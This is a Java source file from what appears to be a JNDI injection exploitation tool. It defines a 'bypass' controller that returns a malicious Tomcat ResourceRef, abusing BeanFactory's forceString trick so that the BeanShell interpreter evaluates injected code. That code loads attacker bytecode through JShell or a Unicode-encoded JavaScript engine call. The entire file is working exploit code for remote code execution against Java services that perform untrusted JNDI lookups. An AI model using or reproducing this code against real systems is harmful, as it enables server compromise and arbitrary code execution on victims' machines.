package map.jndi.controller.bypass;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.JShellPayload;
import map.jndi.payload.JavaScriptPayload;
import map.jndi.util.MiscUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/BeanShell")
public class BeanShellController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + BeanShell");

        ResourceRef ref = new ResourceRef("bsh.Interpreter", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));

        if (Main.config.jshell) {
            String code = JShellPayload.loadClass(byteCode);
            ref.add(new StringRefAddr("x", "jdk.jshell.JShell.create().eval(\"" + code.replace("\n", "").replace("\"", "\\\"") + "\");"));
        } else {
            String code = JavaScriptPayload.loadClass(byteCode);
            ref.add(new StringRefAddr("x", "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + MiscUtil.encodeUnicode(code) + "\");"));
        }

        return ref;
    }
}
